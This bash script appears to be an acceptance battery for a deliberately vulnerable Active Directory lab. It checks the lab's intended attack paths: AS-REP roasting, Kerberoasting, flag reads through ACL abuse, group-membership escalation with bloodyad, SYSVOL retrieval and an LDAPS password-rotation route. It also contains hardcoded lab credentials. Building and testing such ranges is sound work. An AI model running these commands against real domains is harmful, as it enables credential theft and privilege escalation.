#!/usr/bin/env bash
# Final acceptance battery from Kali, standard tool posture.
DC=0.250.250.254
# v2 reforge 2026-11-10: entry ticket parameterized (source of truth =
# secrets.env E_JONES_TICKET; override with EJ_PW=... on the command line)
EJ_PW="${EJ_PW:-summer22}"
echo "===0 KDC authenticity / shadow-stub discriminator (2026-11-08 field lesson)==="
# macOS host KDC stub on UDP:88 replies C_PRINCIPAL_UNKNOWN to *everything*,
# incl. existing principals. Real Samba 4.24 KDC answers PREAUTH_REQUIRED(25)
# to a no-preauth AS-REQ for existing accounts. Never trust Kerb-layer results
# before this passes; fix = Kali socat bridge + krb5 udp_pref (kali_kdc_relay.sh).
# PITFALL 2026-11-08: impacket 0.13.1 prints "User X doesn't have
# UF_DONT_REQUIRE_PREAUTH set" when the AS-REQ got KDC_ERR_PREAUTH_REQUIRED
# (the L-1 wall) — that string == real KDC. The macOS :88 stub answers
# KDC_ERR_C_PRINCIPAL_UNKNOWN for everything including aops.
k0=$(timeout 60 impacket-GetNPUsers LITE.CORP/aops:Qwerty123 -dc-ip $DC -request 2>&1 | grep -oE "UF_DONT_REQUIRE_PREAUTH|PRINCIPAL_UNKNOWN" | sort -u)
if echo "$k0" | grep -q UF_DONT_REQUIRE_PREAUTH && ! echo "$k0" | grep -q PRINCIPAL_UNKNOWN; then
  echo "PASS: real KDC reachable (nft redirect + relay alive) — aops -> PREAUTH_REQUIRED"
else
  echo "FAIL: shadow-stub suspected or wiring down (got: [$k0]) — check lite-kdc-relay + lite-kdc-nft"
fi
echo "===1 AS-REP (authenticated enum, no-pass AS-REQ)==="
# PITFALL 2026-11-04: impacket 0.13.x gates AS-REQ behind -request; without it
# GetNPUsers only enumerates (table, no hash).
timeout 60 impacket-GetNPUsers LITE.CORP/aops:Qwerty123 -dc-ip $DC -request 2>&1 | grep -E 'krb5asrep|Err' | cut -c1-60
echo "===2 Kerberoast==="
timeout 60 impacket-GetUserSPNs LITE.CORP/aops:Qwerty123 -dc-ip $DC -request 2>&1 | grep -E 'krb5tgs|Err' | cut -c1-60
echo "===3 FLAG_LOCAL via ACL (e.jones GenericAll on svc_gateway)==="
ldapsearch -x -H ldap://$DC -D 'e.jones@lite.corp' -w "$EJ_PW" \
  -b 'OU=Services,DC=lite,DC=corp' '(sAMAccountName=svc_gateway)' msLite-Flag 2>/dev/null | grep -i mslite
echo "===4 ACL privesc: e.jones -> Tier-2-Operators==="
# PITFALL(2026-11-09): bloodyad 新版语法改位置参数 `add groupMember <group> <member>`
# (旧 `add member --group/--member` 报 invalid choice)。测完必须 remove 还原出厂态。
bloodyad -d LITE -u e.jones -p "$EJ_PW" -H $DC add groupMember 'Tier-2-Operators' 'e.jones' 2>&1 | tail -2
bloodyad -d LITE -u e.jones -p "$EJ_PW" -H $DC remove groupMember 'Tier-2-Operators' 'e.jones' 2>&1 | tail -2
echo "===5 FLAG_PROOF via replication rights (confidential attr read)==="
ldapsearch -x -H ldap://$DC -D 'e.jones@lite.corp' -w "$EJ_PW" \
  -b 'OU=Domain Controllers,DC=lite,DC=corp' '(sAMAccountName=DC01$)' msLite-Flag 2>/dev/null | grep -i mslite
echo "===6 SYSVOL notes.txt (SMB via mirror port)==="
timeout 15 smbclient -p 1445 //$DC/SYSVOL -N -c 'get lite.corp/scripts/notes.txt -' -m SMB2 2>/dev/null | head -4
echo "===7 SYSVOL via 445 (expect macOS shadow, documented quirk)==="
timeout 8 smbclient //$DC/SYSVOL -N -c ls -m SMB2 2>&1 | grep -oE 'NT_STATUS[A-Z_]*' | head -1
echo "===8 LDAPS 636 publish + UPN-only bind (bb1 friction gate 2026-11-11)==="
# bb1 black-box lesson: Samba 4.24 simple bind accepts UPN only (DOMAIN\user and
# bare user fail 52e with correct creds), and unicodePwd writes require
# ldaps://636 (plaintext 389 -> WILL_NOT_PERFORM). This gate proves the 636
# surface is published and the UPN bind path works — the intended
# password-rotation route depends on both.
if LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://$DC -D 'e.jones@lite.corp' -w "$EJ_PW" \
     -b 'DC=lite,DC=corp' '(sAMAccountName=e.jones)' dn 2>/dev/null | grep -q '^dn: '; then
  echo "PASS: LDAPS 636 bind OK (UPN) — unicodePwd rotation route alive"
else
  echo "FAIL: LDAPS 636 bind failed — password-rotation route dead (check 636 publish / cert / UPN form)"
fi
# informational: same creds in NTLM-style down-level form must fail 49/52e (UPN-only quirk)
LDAPTLS_REQCERT=never ldapwhoami -x -H ldaps://$DC -D 'LITE\e.jones' -w "$EJ_PW" 2>&1 | grep -oE 'invalidCredentials|dn:' | head -1
